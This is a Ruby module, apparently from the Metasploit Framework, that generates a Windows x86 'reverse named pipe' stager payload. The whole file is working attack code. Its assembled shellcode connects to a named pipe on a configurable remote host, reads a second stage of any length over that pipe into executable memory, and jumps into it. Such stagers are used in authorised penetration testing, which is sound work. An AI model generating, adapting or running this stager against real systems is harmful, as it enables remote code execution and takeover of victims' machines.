# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/send_uuid'
require 'msf/core/payload/windows/block_api'
require 'msf/core/payload/windows/exitfunk'

module Msf

###
#
# Complex reverse_named_pipe payload generation for Windows ARCH_X86
#
###

module Payload::Windows::ReverseNamedPipe

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Windows::SendUUID
  include Msf::Payload::Windows::BlockApi
  include Msf::Payload::Windows::Exitfunk

  #
  # Register reverse_named_pipe specific options
  #
  def initialize(*args)
    super
  end

  #
  # Generate the first stage
  #
  def generate
    conf = {
      name:        datastore['PIPENAME'],
      host:        datastore['PIPEHOST'] || '.',
      retry_count: datastore['ReverseConnectRetries'],
      reliable:    false
    }

    # Generate the advanced stager if we have space
    unless self.available_space.nil? || required_space > self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
      conf[:reliable] = true
    end

    generate_reverse_named_pipe(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def transport_config(opts={})
    transport_config_reverse_named_pipe(opts)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_named_pipe(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_named_pipe(opts)}
    ^
    
    #"\xCC" + Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # EXITFUNK 'thread' is the biggest by far, adds 29 bytes.
    space += 29

    # Reliability adds some bytes!
    space += 44

    space += uuid_required_size if include_send_uuid

    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Fixnum] :port The port to connect to
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [Bool] :reliable Whether or not to enable error handling code
  #
  def asm_reverse_named_pipe(opts={})

    retry_count    = [opts[:retry_count].to_i, 1].max
    reliable       = opts[:reliable]
    # we have to double-escape because of metasm
    full_pipe_name = "\\\\\\\\#{opts[:host]}\\\\pipe\\\\#{opts[:name]}"

    asm = %Q^
      ; Input: EBP must be the address of 'api_call'.
      ; Output: EDI will be the handle for the pipe to the server

      retry_start:
        push #{retry_count}     ; retry counter
        mov esi, esp            ; keep track of where the variables are

      try_reverse_named_pipe:
        ; Start by setting up the call to CreateFile
        xor ebx, ebx            ; EBX will be used for pushing zero
        push ebx                ; hTemplateFile
        push ebx                ; dwFlagsAndAttributes
        push 3                  ; dwCreationDisposition (OPEN_EXISTING)
        push ebx                ; lpSecurityAttributes
        push ebx                ; dwShareMode
        push 0xC0000000         ; dwDesiredAccess (GENERIC_READ|GENERIC_WRITE)
        call get_pipe_name
        db "#{full_pipe_name}", 0x00
      get_pipe_name:
                                ; lpFileName (via call)
        push #{Rex::Text.block_api_hash('kernel32.dll', 'CreateFileA')}
        call ebp                ; CreateFileA(...)

        ; If eax is -1, then we had a failure.
        cmp eax, -1             ; -1 means a failure
        jnz connected

      handle_connect_failure:
        ; decrement our attempt count and try again
        dec [esi]
        jnz try_reverse_named_pipe
    ^

    if opts[:exitfunk]
      asm << %Q^
      failure:
        call exitfunk
      ^
    else
      asm << %Q^
      failure:
        push 0x56A2B5F0         ; hardcoded to exitprocess for size
        call ebp
      ^
    end

    asm << %Q^
      ; this label is required so that reconnect attempts include
      ; the UUID stuff if required.
      connected:
        xchg edi, eax           ; edi now has the file handle we'll need in future
    ^

    asm << asm_write_uuid if include_send_uuid

    asm << %Q^
        ; Receive the size of the incoming second stage...
        push ebx                ; buffer for lpNumberOfBytesRead
        mov ecx, esp
        push ebx                ; buffer for lpBuffer
        mov esi, esp
        push ebx                ; lpOverlapped
        push ecx                ; lpNumberOfBytesRead
        push 4                  ; nNumberOfBytesToRead = sizeof( DWORD );
        push esi                ; lpBuffer
        push edi                ; hFile
        push #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
        call ebp                ; ReadFile(...) to read the size
    ^

    if reliable
      asm << %Q^
        ; reliability: check to see if the file read worked, retry otherwise
        ; if it fails
        test eax, eax
        jz cleanup_file
        mov eax, [esi+4]        ; check to see if bytes were read
        test eax, eax
        jz cleanup_file
      ^
    end

    asm << %Q^
        ; Alloc a RWX buffer for the second stage
        mov esi, [esi]          ; dereference the pointer to the second stage length
        push 0x40               ; PAGE_EXECUTE_READWRITE
        push 0x1000             ; MEM_COMMIT
        push esi                ; push the newly received second stage length.
        push 0                  ; NULL as we dont care where the allocation is.
        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call ebp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
        ; Receive the second stage and execute it...
        xchg ebx, eax           ; ebx = our new memory address for the new stage
        push ebx                ; push the address of the new stage so we can return into it

      read_more:
        ; prepare the size min(0x10000, esi)
        mov ecx, 0x10000         ; stupid named pipe buffer limit
        cmp ecx, esi
        jle size_is_good
        mov ecx, esi

      size_is_good:
        ; Invoke a read
        push eax                ; space for the number of bytes
        mov eax, esp            ; store the pointer
        push 0                  ; lpOverlapped
        push eax                ; lpNumberOfBytesRead
        push ecx                ; nNumberOfBytesToRead
        push ebx                ; lpBuffer
        push edi                ; hFile
        push #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
        call ebp                ; ReadFile(...) to read the data
    ^

    if reliable
      asm << %Q^
        ; reliability: check to see if the recv worked, and reconnect
        ; if it fails
        cmp eax, 0
        jz read_failed
        pop eax                 ; get the number of bytes read
        cmp eax, 0
        jnz read_successful

      read_failed:
        ; something failed, free up memory
        pop eax                 ; get the address of the payload
        push 0x4000             ; dwFreeType (MEM_DECOMMIT)
        push 0                  ; dwSize
        push eax                ; lpAddress
        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
        call ebp                ; VirtualFree(payload, 0, MEM_DECOMMIT)

      cleanup_file:
        ; clear up the named pipe handle
        push edi                ; named pipe handle
        push #{Rex::Text.block_api_hash('kernel32.dll', 'CloseHandle')}
        call ebp                ; CloseHandle(...)

        ; restore the stack back to the connection retry count
        pop esi
        pop esi
        pop esi
        dec [esp]               ; decrement the counter

        ; try again
        jmp try_reverse_named_pipe
      ^
    else
      asm << %Q^
        pop eax                 ; pop bytes read
      ^
    end

    asm << %Q^
      read_successful:
        add ebx, eax            ; buffer += bytes_received
        sub esi, eax            ; length -= bytes_received, will set flags
        jnz read_more           ; continue if we have more to read
        ret                     ; return into the second stage
    ^

    if opts[:exitfunk]
      asm << asm_exitfunk(opts)
    end

    asm
  end

end

end
